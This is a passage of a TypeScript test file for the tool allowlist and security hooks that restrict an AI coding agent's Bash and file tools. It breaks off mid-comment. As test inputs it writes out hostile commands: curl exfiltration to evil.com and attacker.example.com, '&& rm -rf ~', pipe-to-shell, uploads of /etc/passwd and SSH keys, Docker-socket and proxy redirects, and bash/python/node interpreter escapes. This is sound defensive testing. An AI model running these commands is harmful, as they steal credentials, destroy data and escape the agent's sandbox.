/**
 * Peer tests for `./claude-tool-collection.ts` — pure-helper extraction
 * from `claude-code-core.ts` per file-split-plan §8 Tier 2.
 *
 * Scope:
 *  - `getAllowedTools` — exhaustive over the override / web-search /
 *    delegated-tools / native-tools axes, mirroring the legacy
 *    `(core as any).getAllowedTools` tests in `claude-code-core.test.ts`.
 *  - `getDelegatedClaudeTools` / `getNativeClaudeTools` /
 *    `getSessionDeniedTools` — confirm the "no mcpContext → []" contract
 *    and the conservative read-failure fallback. The native counterpart
 *    is registry-driven parallel to delegated (INTEGRATION_NATIVE_MODE_DESIGN.md §11).
 *  - `buildSecurityHooks` — shape and routing checks (matcher list,
 *    hook count per matcher). Detailed per-hook behavior remains
 *    covered by `claude-code-core.test.ts` against the class shim so
 *    we don't duplicate the regex / path-form edge cases here.
 */

import { describe, it, expect, beforeEach } from "vitest";
import Database from "better-sqlite3";

import {
  buildSecurityHooks,
  getAllowedTools,
  getDelegatedClaudeTools,
  getNativeClaudeTools,
  getSessionDeniedTools,
  CLAUDE_DEFAULT_ALLOWED_TOOLS,
} from "./claude-tool-collection.js";
import { applySchema } from "../../db/schema.js";
import { writeIntegrations } from "../../db/integrations-store.js";
import type { AgentConfig } from "../../config.js";

function makeConfig(overrides: Partial<AgentConfig> = {}): AgentConfig {
  return {
    apiPort: 8321,
    dataDir: "/tmp/pa-test",
    workspaceDir: ".",
    character: "",
    disallowedTools: [],
    allowedToolsOverride: null,
    externalObsidianVaultPath: null,
    claudeExecutionPermissionMode: "safe",
    ...overrides,
  } as unknown as AgentConfig;
}

describe("getAllowedTools", () => {
  it("returns the default base list when no override is set", () => {
    const tools = getAllowedTools(makeConfig(), false);
    for (const t of CLAUDE_DEFAULT_ALLOWED_TOOLS) {
      expect(tools).toContain(t);
    }
    expect(tools).not.toContain("WebSearch");
  });

  it("adds WebSearch only when web-search is enabled and no override", () => {
    const tools = getAllowedTools(makeConfig(), true);
    expect(tools).toContain("WebSearch");
  });

  it("returns the override verbatim (sans WebSearch) when override is set", () => {
    const tools = getAllowedTools(
      makeConfig({ allowedToolsOverride: ["Read", "Glob"] }),
      true,
    );
    expect(tools).toEqual(["Read", "Glob"]);
    expect(tools).not.toContain("WebSearch");
  });

  it("unions delegated tools onto the default base", () => {
    const delegated = ["mcp__claude_ai_Gmail__search_threads"] as const;
    const tools = getAllowedTools(makeConfig(), false, delegated);
    expect(tools).toContain("mcp__claude_ai_Gmail__search_threads");
    for (const t of CLAUDE_DEFAULT_ALLOWED_TOOLS) {
      expect(tools).toContain(t);
    }
  });

  it("unions delegated tools onto a user override (deviation from override's replace-all semantics)", () => {
    const delegated = ["mcp__claude_ai_Gmail__search_threads"] as const;
    const tools = getAllowedTools(
      makeConfig({ allowedToolsOverride: ["Read"] }),
      false,
      delegated,
    );
    expect(tools).toContain("Read");
    expect(tools).toContain("mcp__claude_ai_Gmail__search_threads");
  });

  it("deduplicates if delegated includes a tool that's already in base", () => {
    const tools = getAllowedTools(makeConfig(), false, ["Read"]);
    const reads = tools.filter((t) => t === "Read");
    expect(reads).toHaveLength(1);
  });

  it("unions native tools onto the default base", () => {
    const native = ["mcp__claude_ai_Google_Calendar__list_events"] as const;
    const tools = getAllowedTools(makeConfig(), false, [], native);
    expect(tools).toContain("mcp__claude_ai_Google_Calendar__list_events");
    for (const t of CLAUDE_DEFAULT_ALLOWED_TOOLS) {
      expect(tools).toContain(t);
    }
  });

  it("unions delegated AND native tools simultaneously", () => {
    const delegated = ["mcp__claude_ai_Gmail__search_threads"] as const;
    const native = ["mcp__claude_ai_Google_Calendar__list_events"] as const;
    const tools = getAllowedTools(makeConfig(), false, delegated, native);
    expect(tools).toContain("mcp__claude_ai_Gmail__search_threads");
    expect(tools).toContain("mcp__claude_ai_Google_Calendar__list_events");
  });

  it("unions native tools onto a user override (same orthogonality contract as delegated)", () => {
    const native = ["mcp__claude_ai_Gmail__search_threads"] as const;
    const tools = getAllowedTools(
      makeConfig({ allowedToolsOverride: ["Read"] }),
      false,
      [],
      native,
    );
    expect(tools).toContain("Read");
    expect(tools).toContain("mcp__claude_ai_Gmail__search_threads");
  });

  it("deduplicates if native includes a tool that's already in base", () => {
    const tools = getAllowedTools(makeConfig(), false, [], ["Read"]);
    const reads = tools.filter((t) => t === "Read");
    expect(reads).toHaveLength(1);
  });

  it("appends ToolSearch when delegated tools are unioned in (Claude defers MCP schemas)", () => {
    // Without ToolSearch the model cannot load deferred MCP schemas, so the
    // unioned tool names are unreachable and the session collapses to a
    // "Bash and WebFetch denied" failure DM. Mirrors the same widening in
    // `composePrePassAllowedTools` and `claude-delegated.ts`.
    const tools = getAllowedTools(
      makeConfig(),
      false,
      ["mcp__claude_ai_Gmail__search_threads"],
    );
    expect(tools).toContain("ToolSearch");
  });

  it("appends ToolSearch when native tools are unioned in", () => {
    const tools = getAllowedTools(
      makeConfig(),
      false,
      [],
      ["mcp__claude_ai_Google_Calendar__list_events"],
    );
    expect(tools).toContain("ToolSearch");
  });

  it("appends ToolSearch even when allowedToolsOverride is set and MCP tools are unioned in", () => {
    // Same orthogonality contract as the MCP-tools union above — silently
    // dropping ToolSearch while keeping the MCP names defeats the widening.
    const tools = getAllowedTools(
      makeConfig({ allowedToolsOverride: ["Read"] }),
      false,
      [],
      ["mcp__claude_ai_Notion__notion-search"],
    );
    expect(tools).toContain("ToolSearch");
    expect(tools).toContain("mcp__claude_ai_Notion__notion-search");
  });

  it("does NOT append ToolSearch when neither delegated nor native tools are present", () => {
    // ToolSearch is dead weight on a pure curl/jq session; keep the
    // surface minimal.
    const tools = getAllowedTools(makeConfig(), false);
    expect(tools).not.toContain("ToolSearch");
  });

  it("strips Write/Edit when wikiApiOnlyWrites is set so wiki.* sessions cannot bypass the API", () => {
    const tools = getAllowedTools(makeConfig(), false, [], [], false, true);
    expect(tools).not.toContain("Write");
    expect(tools).not.toContain("Edit");
    // The rest of the default surface stays — Read, Glob, Grep, Bash(curl *), etc.
    expect(tools).toContain("Read");
    expect(tools).toContain("Bash(curl *)");
  });

  it("keeps Write/Edit by default (non-wiki sessions are unaffected)", () => {
    const tools = getAllowedTools(makeConfig(), false);
    expect(tools).toContain("Write");
    expect(tools).toContain("Edit");
  });

  it("strips Write/Edit even when an explicit allowedToolsOverride includes them — the wiki narrowing wins over the override", () => {
    const tools = getAllowedTools(
      makeConfig({ allowedToolsOverride: ["Read", "Write", "Edit"] }),
      false,
      [],
      [],
      false,
      true,
    );
    expect(tools).not.toContain("Write");
    expect(tools).not.toContain("Edit");
    expect(tools).toContain("Read");
  });

  it("wikiApiOnlyWrites composes with wikiUrlFetchEnabled — WebFetch added, Write/Edit removed", () => {
    const tools = getAllowedTools(makeConfig(), false, [], [], true, true);
    expect(tools).toContain("WebFetch");
    expect(tools).not.toContain("Write");
    expect(tools).not.toContain("Edit");
  });
});

describe("getDelegatedClaudeTools / getNativeClaudeTools / getSessionDeniedTools", () => {
  let db: Database.Database;

  beforeEach(() => {
    db = new Database(":memory:");
    applySchema(db);
  });

  it("returns [] when mcpContext is undefined", () => {
    expect(getDelegatedClaudeTools(undefined)).toEqual([]);
    expect(getNativeClaudeTools(undefined)).toEqual([]);
    expect(getSessionDeniedTools(undefined)).toEqual([]);
  });

  it("returns [] when integrations table is empty", () => {
    expect(getDelegatedClaudeTools({ db })).toEqual([]);
    expect(getNativeClaudeTools({ db })).toEqual([]);
    expect(getSessionDeniedTools({ db })).toEqual([]);
  });

  it("getNativeClaudeTools returns namespaced Claude tools when Gmail is native to Claude", () => {
    writeIntegrations(db, {
      gmail: {
        mode: "native",
        nativeBackend: "claude",
        deniedTools: [],
        lastChangedAt: "2026-05-11T00:00:00Z",
      },
    });
    const tools = getNativeClaudeTools({ db });
    expect(tools.length).toBeGreaterThan(0);
    expect(tools.every((t) => t.startsWith("mcp__claude_ai_"))).toBe(true);
  });

  it("getNativeClaudeTools excludes integrations native to a non-Claude backend", () => {
    writeIntegrations(db, {
      gmail: {
        mode: "native",
        nativeBackend: "codex",
        deniedTools: [],
        lastChangedAt: "2026-05-11T00:00:00Z",
      },
    });
    expect(getNativeClaudeTools({ db })).toEqual([]);
  });

  it("returns namespaced Claude tools for a Gmail integration delegated to Claude", () => {
    // Use writeIntegrations so the row passes the schema validator the
    // reader applies. The assertion is "registry-driven prefixes appear"
    // not "specific tool name appears", so the test stays robust to
    // capability churn.
    writeIntegrations(db, {
      gmail: {
        mode: "delegated",
        delegatedBackend: "claude",
        deniedTools: [],
        lastChangedAt: "2026-05-10T00:00:00Z",
      },
    });

    const tools = getDelegatedClaudeTools({ db });
    expect(tools.length).toBeGreaterThan(0);
    expect(tools.every((t) => t.startsWith("mcp__claude_ai_"))).toBe(true);
  });

  it("excludes integrations delegated to a non-Claude backend", () => {
    writeIntegrations(db, {
      gmail: {
        mode: "delegated",
        delegatedBackend: "codex",
        deniedTools: [],
        lastChangedAt: "2026-05-10T00:00:00Z",
      },
    });
    expect(getDelegatedClaudeTools({ db })).toEqual([]);
  });

  it("swallows DB read failures and returns [] (warn-and-continue contract)", () => {
    db.close();
    expect(getDelegatedClaudeTools({ db })).toEqual([]);
    expect(getNativeClaudeTools({ db })).toEqual([]);
    expect(getSessionDeniedTools({ db })).toEqual([]);
  });
});

describe("buildSecurityHooks", () => {
  // A benign curl is "permitted" when the hook does not block it. Since the
  // single-pure-curl allow gate landed (heredoc retry fix), a validated lone
  // curl is permitted via an explicit `permissionDecision: "allow"`, while a
  // compound / piped / redirected curl is permitted by deferral
  // (`{ continue: true }` → allowedTools). The false-positive-regression tests
  // below only care that the command is NOT blocked, so accept either shape.
  const expectPermitted = (r: unknown) => {
    const result = r as {
      decision?: string;
      continue?: boolean;
      hookSpecificOutput?: { permissionDecision?: string };
    };
    expect(result.decision).not.toBe("block");
    expect(
      result.continue === true
        || result.hookSpecificOutput?.permissionDecision === "allow",
    ).toBe(true);
  };

  it("produces matchers for Bash, Write, Edit, and Read", () => {
    const hooks = buildSecurityHooks({ config: makeConfig() });
    expect(hooks.PreToolUse).toHaveLength(4);
    const matchers = hooks.PreToolUse.map((p) => p.matcher);
    expect(matchers).toEqual(["Bash", "Write", "Edit", "Read"]);
  });

  it("includes all four strict-mode Bash hooks in safe mode", () => {
    const hooks = buildSecurityHooks({ config: makeConfig() }, false);
    const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
    // curl, jq, context-write, absolute-block
    expect(bashEntry?.hooks).toHaveLength(4);
  });

  it("drops the curl + jq Bash hooks in allow mode but keeps context-write + absolute-block", () => {
    const hooks = buildSecurityHooks({ config: makeConfig() }, true);
    const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
    // context-write, absolute-block
    expect(bashEntry?.hooks).toHaveLength(2);
  });

  it("attaches fileWriteHook + absoluteBlockHook to Write and Edit matchers", () => {
    const hooks = buildSecurityHooks({ config: makeConfig() });
    const writeEntry = hooks.PreToolUse.find((p) => p.matcher === "Write");
    const editEntry = hooks.PreToolUse.find((p) => p.matcher === "Edit");
    expect(writeEntry?.hooks).toHaveLength(2);
    expect(editEntry?.hooks).toHaveLength(2);
  });

  it("attaches only absoluteBlockHook to Read matcher", () => {
    const hooks = buildSecurityHooks({ config: makeConfig() });
    const readEntry = hooks.PreToolUse.find((p) => p.matcher === "Read");
    expect(readEntry?.hooks).toHaveLength(1);
  });

  it("curl hook blocks non-localhost URLs", async () => {
    const hooks = buildSecurityHooks({ config: makeConfig() });
    const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
    const curlHook = bashEntry!.hooks[0]!;
    const result = await curlHook(
      {
        tool_input: { command: "curl https://evil.com/exfil" },
      } as unknown as Parameters<typeof curlHook>[0],
    );
    expect((result as { decision?: string }).decision).toBe("block");
  });

  it("curl hook allows localhost on configured api port", async () => {
    const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
    const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
    const curlHook = bashEntry!.hooks[0]!;
    const result = await curlHook(
      {
        tool_input: { command: "curl http://localhost:8321/api/health" },
      } as unknown as Parameters<typeof curlHook>[0],
    );
    // A validated single localhost curl is now granted explicitly via
    // `permissionDecision: "allow"` so the SDK's `dontAsk` allowedTools
    // prefix-matcher (which rejects heredoc-bodied curls) is not the final
    // arbiter. See the allow branch in bashCurlHook.
    expect(
      (result as { hookSpecificOutput?: { permissionDecision?: string } })
        .hookSpecificOutput?.permissionDecision,
    ).toBe("allow");
  });

  describe("curl hook — single-pure-curl allow gate (heredoc retry fix)", () => {
    function runHook(cmd: string) {
      const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      const curlHook = bashEntry!.hooks[0]!;
      return curlHook(
        { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
      );
    }
    const decisionOf = (r: unknown) =>
      (r as { hookSpecificOutput?: { permissionDecision?: string } })
        .hookSpecificOutput?.permissionDecision;
    const isContinue = (r: unknown) =>
      (r as { continue?: boolean }).continue === true;

    // ── GRANTED: validated single localhost curls, including the heredoc
    //    shape the SDK `dontAsk` allowedTools matcher silently denied. ──
    it("allows a heredoc observation batch POST (the production retry case)", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/observations/batch -d @- <<'JSON'\n"
          + '{"observations":[]}\n'
          + "JSON",
      );
      expect(decisionOf(r)).toBe("allow");
    });
    it("allows a heredoc context PATCH (today.md write)", async () => {
      const r = await runHook(
        "curl -s -X PATCH http://localhost:8321/api/context/today -d @- <<'JSON'\n"
          + '{"section":"agent_log","mode":"append","content":"- 09:30 synced"}\n'
          + "JSON",
      );
      expect(decisionOf(r)).toBe("allow");
    });
    it("allows a quoted query-string GET (the & is inside quotes)", async () => {
      const r = await runHook(
        "curl 'http://localhost:8321/api/observations?pending=true&limit=30'",
      );
      expect(decisionOf(r)).toBe("allow");
    });

    // ── NOT GRANTED: anything beyond a lone curl falls through to
    //    `{ continue: true }` so allowedTools + absolute-block +
    //    disallowedTools stay authoritative. These must NOT be "allow". ──
    it("does NOT allow a second chained command (&& rm -rf)", async () => {
      const r = await runHook("curl http://localhost:8321/api/health && rm -rf ~");
      expect(decisionOf(r)).toBeUndefined();
      expect(isContinue(r)).toBe(true);
    });
    it("does NOT allow a shell output redirect (> file)", async () => {
      const r = await runHook("curl http://localhost:8321/api/health > /etc/passwd");
      expect(decisionOf(r)).toBeUndefined();
      expect(isContinue(r)).toBe(true);
    });
    it("does NOT allow command substitution in a header value", async () => {
      const r = await runHook(
        'curl http://localhost:8321/api/health -H "X-Probe: $(whoami)"',
      );
      expect(decisionOf(r)).toBeUndefined();
      expect(isContinue(r)).toBe(true);
    });
    it("does NOT allow a variable expansion in a double-quoted URL", async () => {
      const r = await runHook(
        'curl "http://localhost:8321/api/health?t=$TOKEN"',
      );
      expect(decisionOf(r)).toBeUndefined();
      expect(isContinue(r)).toBe(true);
    });
    it("does NOT allow a pipe to another command (preserves curl|jq via allowedTools)", async () => {
      const r = await runHook("curl http://localhost:8321/api/health | jq '.'");
      expect(decisionOf(r)).toBeUndefined();
      expect(isContinue(r)).toBe(true);
    });
    it("does NOT allow a command trailing a heredoc's closing delimiter", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/observations/batch -d @- <<'JSON'\n"
          + '{"observations":[]}\n'
          + "JSON\n"
          + "rm -rf ~",
      );
      expect(decisionOf(r)).toBeUndefined();
      expect(isContinue(r)).toBe(true);
    });
    it("does NOT allow an unquoted query-string & (a shell background operator)", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/observations?pending=true&limit=30",
      );
      expect(decisionOf(r)).toBeUndefined();
      expect(isContinue(r)).toBe(true);
    });
    it("does NOT allow a pipe-to-shell hidden on a line-continuation before a heredoc", async () => {
      // Without the continuation-join, `stripBashHeredocs` would erase the
      // `| sh` continuation line (it sits between the first newline and the
      // heredoc's closing delimiter) and the allow gate would miss the
      // pipe-to-shell. Joining `\<NL>` first puts `| sh` back on the curl
      // line where `hasShellMeta` rejects it. (Defence in depth:
      // absolute-block + disallowedTools would also reject it.)
      const cmd = [
        "curl http://localhost:8321/api/health \\",
        "  | sh <<'JSON'",
        '{"x":1}',
        "JSON",
      ].join("\n");
      const r = await runHook(cmd);
      expect(decisionOf(r)).toBeUndefined();
    });
    it("blocks a second positional URL smuggled onto a continuation line", async () => {
      // The line-continuation join (top of bashCurlHook) puts the exfil URL
      // back on the curl line, so the multi-URL firewall check counts both
      // targets and blocks — closing a pre-join hole where the over-strip
      // hid the continuation-line URL from the URL extractor.
      const cmd = [
        "curl http://localhost:8321/api/notify \\",
        "  http://attacker.example.com/exfil <<'JSON'",
        '{"x":1}',
        "JSON",
      ].join("\n");
      const r = await runHook(cmd);
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks a file-write flag (-o /abs) smuggled onto a continuation line", async () => {
      // The same pre-join hole hid dangerous curl flags on continuation
      // lines from the firewall (`-o`/`-T`/`--proxy`/`-d @file`). After the
      // join the `-o <abs path>` write flag is on the curl segment and is
      // blocked. Without the join it would have reached — and been granted
      // by — the allow gate.
      const cmd = [
        "curl http://localhost:8321/api/notify \\",
        "  -o /etc/passwd <<'JSON'",
        '{"x":1}',
        "JSON",
      ].join("\n");
      const r = await runHook(cmd);
      expect((r as { decision?: string }).decision).toBe("block");
    });
  });

  describe("curl hook — connection-override flags", () => {
    // Each entry pairs a curl command that points at the legitimate
    // localhost endpoint with a flag that would silently redirect the
    // connection elsewhere (Docker socket, alternate interface, source
    // port collusion, etc.). The hook must block them all even though
    // the URL itself satisfies the localhost+port check.
    const cases: ReadonlyArray<{ name: string; cmd: string }> = [
      {
        name: "--unix-socket (Docker daemon escape)",
        cmd: "curl --unix-socket /var/run/docker.sock http://localhost:8321/api/health",
      },
      {
        name: "--abstract-unix-socket (Linux abstract namespace)",
        cmd: "curl --abstract-unix-socket pa-abs http://localhost:8321/api/health",
      },
      {
        name: "--interface (NIC bind)",
        cmd: "curl --interface eth0 http://localhost:8321/api/health",
      },
      {
        name: "--local-port (source port pinning)",
        cmd: "curl --local-port 54321 http://localhost:8321/api/health",
      },
      {
        name: "--connect-to (host redirect)",
        cmd: "curl --connect-to localhost:8321:evil.example:443 http://localhost:8321/api/health",
      },
      {
        name: "--resolve (DNS override)",
        cmd: "curl --resolve localhost:8321:203.0.113.1 http://localhost:8321/api/health",
      },
      {
        name: "--proxy (HTTP proxy redirect)",
        cmd: "curl --proxy http://evil.example:1080 http://localhost:8321/api/health",
      },
      {
        name: "--socks5 (SOCKS proxy)",
        cmd: "curl --socks5 evil.example:1080 http://localhost:8321/api/health",
      },
      {
        name: "--config (alternate config file)",
        cmd: "curl --config /tmp/evil.conf http://localhost:8321/api/health",
      },
    ];
    for (const { name, cmd } of cases) {
      it(`blocks ${name}`, async () => {
        const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
        const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
        const curlHook = bashEntry!.hooks[0]!;
        const result = await curlHook(
          { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
        );
        expect((result as { decision?: string }).decision).toBe("block");
      });
    }

    it("allows benign curl with NO override flag (regression — the deny regex must not over-match)", async () => {
      const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      const curlHook = bashEntry!.hooks[0]!;
      // -X is a request-method flag, not a proxy alias. The deny rule
      // for `-x` (proxy) must require a word boundary so this passes.
      const result = await curlHook(
        {
          tool_input: {
            command: "curl -X POST -H 'Content-Type: application/json' http://localhost:8321/api/health",
          },
        } as unknown as Parameters<typeof curlHook>[0],
      );
      // Permitted — now via an explicit allow (see allow branch).
      expect(
        (result as { hookSpecificOutput?: { permissionDecision?: string } })
          .hookSpecificOutput?.permissionDecision,
      ).toBe("allow");
    });
  });

  describe("curl hook — file-read exfil flags (audit #6)", () => {
    function runHook(cmd: string) {
      const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      const curlHook = bashEntry!.hooks[0]!;
      return curlHook(
        { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
      );
    }

    it("blocks --upload-file", async () => {
      const r = await runHook(
        "curl --upload-file /etc/passwd http://localhost:8321/api/health",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -T short form", async () => {
      const r = await runHook("curl -T /etc/shadow http://localhost:8321/api/health");
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -d @<file>", async () => {
      const r = await runHook(
        "curl -X POST http://localhost:8321/api/notify -d @/Users/alice/.ssh/id_rsa",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks --data-binary @<file>", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/notify --data-binary @/etc/passwd",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks --data-binary=@<file> (equals separator)", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/notify --data-binary=@/etc/passwd",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -d \"@<file>\" with quotes", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/notify -d \"@/etc/passwd\"",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -F name=@<file>", async () => {
      const r = await runHook(
        "curl -F file=@/etc/passwd http://localhost:8321/api/upload",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -F name=<<file>", async () => {
      const r = await runHook(
        "curl -F text=</etc/passwd http://localhost:8321/api/upload",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("allows -d @- (canonical stdin marker)", async () => {
      const r = await runHook(
        "curl -X PATCH http://localhost:8321/api/context/today -d @-",
      );
      expectPermitted(r);
    });
    it("allows -d \"@-\" (quoted stdin marker)", async () => {
      const r = await runHook(
        "curl -X PATCH http://localhost:8321/api/context/today -d \"@-\"",
      );
      expectPermitted(r);
    });
    it("blocks -d '@<file>' (single-quoted @-file attack)", async () => {
      // Regression: the tokenized value walker must catch this; the
      // older regex `["']?@` and the scan-stripped form both lost it.
      const r = await runHook(
        "curl http://localhost:8321/api/notify -d '@/etc/passwd'",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -d='@<file>' (single-quoted @-file via equals separator)", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/notify -d='@/etc/passwd'",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("allows a JSON body that happens to contain the substring ' -d @x ' (was: false-positive)", async () => {
      const r = await runHook(
        `curl -X PATCH http://localhost:8321/api/context/agent/journal -H 'Content-Type: application/json' -d '{"section":"notes","mode":"append","content":"avoid the curl -d @file syntax in skills"}'`,
      );
      expectPermitted(r);
    });
    it("allows -F with a benign description that contains '@' inside the value (no leading `=@`)", async () => {
      const r = await runHook(
        `curl -X POST http://localhost:8321/api/notify -F 'description=ping @username for triage'`,
      );
      expectPermitted(r);
    });
    it("blocks -F 'name=@<file>' (single-quoted form)", async () => {
      const r = await runHook(
        "curl -F 'file=@/etc/passwd' http://localhost:8321/api/upload",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
  });

  describe("curl hook — file-write flags (audit #6)", () => {
    function runHook(cmd: string) {
      const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      const curlHook = bashEntry!.hooks[0]!;
      return curlHook(
        { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
      );
    }

    it("allows -o <simple-relative-filename> (e.g. receipt PDF download)", async () => {
      const r = await runHook(
        "curl -s -X POST http://localhost:8321/api/receipts/1/download -o receipt.pdf",
      );
      expectPermitted(r);
    });
    it("blocks -o /etc/passwd (absolute path)", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/x -o /etc/passwd",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -o ../../escape (parent escape)", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/x -o ../../escape.bin",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks --remote-name", async () => {
      const r = await runHook("curl -O http://localhost:8321/api/x/file.zip");
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks --dump-header to a file", async () => {
      const r = await runHook(
        "curl -D /tmp/hdr.txt http://localhost:8321/api/health",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks --cookie-jar", async () => {
      const r = await runHook(
        "curl -c /tmp/jar http://localhost:8321/api/health",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks --trace", async () => {
      const r = await runHook(
        "curl --trace /tmp/trace.log http://localhost:8321/api/health",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks --cert (TLS client cert file read)", async () => {
      const r = await runHook(
        "curl --cert /Users/alice/.ssh/id_rsa http://localhost:8321/api/health",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -L (follow redirects off-localhost)", async () => {
      const r = await runHook("curl -L http://localhost:8321/api/redirect");
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks combined-short-flag form ending in L (-fsSL)", async () => {
      const r = await runHook("curl -fsSL http://localhost:8321/api/redirect");
      expect((r as { decision?: string }).decision).toBe("block");
    });

    // ── Critical-review C1: combined short-flag bundle for every
    //    dangerous letter (`-fs<letter>` style). Each blocked letter
    //    must reject regardless of preceding short-flag company.
    const combinedShortFlagCases: ReadonlyArray<{ letter: string; suffix: string }> = [
      { letter: "T", suffix: "/etc/passwd http://localhost:8321/api/health" },  // read
      { letter: "O", suffix: "http://localhost:8321/api/file.zip" },             // write
      { letter: "D", suffix: "/tmp/hdr.txt http://localhost:8321/api/health" }, // dump
      { letter: "c", suffix: "/tmp/jar http://localhost:8321/api/health" },     // cookie-jar write
      { letter: "b", suffix: "/etc/passwd http://localhost:8321/api/health" },  // cookie file read
      { letter: "w", suffix: "'%{stderr}' http://localhost:8321/api/health" },   // write-out
      { letter: "E", suffix: "/Users/alice/.ssh/id_rsa http://localhost:8321/api/health" }, // cert
      { letter: "o", suffix: "/etc/passwd http://localhost:8321/api/health" },  // output absolute
    ];
    for (const { letter, suffix } of combinedShortFlagCases) {
      it(`blocks combined-short-flag bundle -fs${letter} (audit-driven C1)`, async () => {
        const r = await runHook(`curl -fs${letter} ${suffix}`);
        expect(
          (r as { decision?: string }).decision,
          `letter -fs${letter} should be blocked`,
        ).toBe("block");
      });
    }
    it("blocks -o with a quoted absolute path (no whitespace-stop bypass)", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/x -o \"/etc/passwd\"",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -o with a quoted path that contains spaces", async () => {
      // The naive `[^\s'\"]+` value matcher would fail to capture this
      // path. The hook must still reject — falling through to "allow"
      // because the regex couldn't parse is the bypass we're closing.
      const r = await runHook(
        "curl http://localhost:8321/api/x -o \"/some path/secret.bin\"",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -o with a shell-expansion value (e.g. $(get-target))", async () => {
      const r = await runHook(
        "curl http://localhost:8321/api/x -o $(get-target)",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks -o with an unparseable value (flag with no argument)", async () => {
      // `-o` at end of command (no value) is malformed; deny rather
      // than fall-through to allow.
      const r = await runHook("curl http://localhost:8321/api/x -o");
      expect((r as { decision?: string }).decision).toBe("block");
    });
  });

  describe("bashContextWriteHook — interpreter escape hatches (audit #4)", () => {
    function runHook(cmd: string, cwd = "/tmp/pa-session") {
      const hooks = buildSecurityHooks({ config: makeConfig() });
      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
      // index 2 in safe mode: [curl, jq, contextWrite, absoluteBlock]
      const ctxHook = bashEntry!.hooks[2]!;
      return ctxHook(
        {
          tool_input: { command: cmd },
          cwd,
        } as unknown as Parameters<typeof ctxHook>[0],
      );
    }

    it("blocks bash -c", async () => {
      const r = await runHook("bash -c 'cat /etc/passwd'");
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks python3 -c", async () => {
      const r = await runHook(
        "python3 -c 'open(\"/x/context/today.md\", \"w\").write(\"evil\")'",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks node -e", async () => {
      const r = await runHook("node -e 'require(\"fs\").writeFileSync(\"/tmp/x\", \"\")'");
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("allows benign curl/jq pipelines (regression — no over-match on legitimate commands)", async () => {
      const r = await runHook(
        "curl -s http://localhost:8321/api/health | jq .status",
      );
      expect((r as { continue?: boolean }).continue).toBe(true);
    });
    it("blocks `cd <data-dir> && echo > ...` via data-dir reference", async () => {
      // Layer 2 cannot resolve the post-`cd` relative path (the hook
      // sees only the *initial* cwd), but the data-dir token resolves
      // to the data dir itself — which Layer 2 now refuses outright as
      // an out-of-bounds reference. makeConfig pins dataDir to
      // `/tmp/pa-test`; the chained command references it directly.
      const r = await runHook(
        "cd /tmp/pa-test && echo evil > context/today.md",
      );
      expect((r as { decision?: string }).decision).toBe("block");
    });
    it("blocks any direct reference to the data dir, regardless of intent", async () => {
      const r = await runHook("ls -la /tmp/pa-test");
      expect((r as { decision?: string }).decision).toBe("block");
    });
  });

  describe("bashContextWriteHook — cwd-inside-data-dir false-positive regression", () => {
    // Production cwd is always `<dataDir>/agent-sessions/<id>`, i.e. INSIDE
    // the data dir. The earlier Layer-2 filter `if (!tok.includes("/") &&
